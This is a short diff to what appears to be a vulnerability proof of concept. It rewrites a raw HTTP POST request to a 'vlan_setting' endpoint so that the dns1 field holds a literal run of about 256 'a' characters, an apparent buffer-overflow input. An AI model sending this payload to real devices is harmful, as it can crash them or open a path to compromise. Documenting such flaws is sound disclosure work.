@@ -17,5 +17,5 @@ Connection: keep-alive
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 146
 
-action=vlan_setting&method=static&dns1='a'*0x100&dns2=a
+action=vlan_setting&method=static&dns1=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&dns2=a
 ```
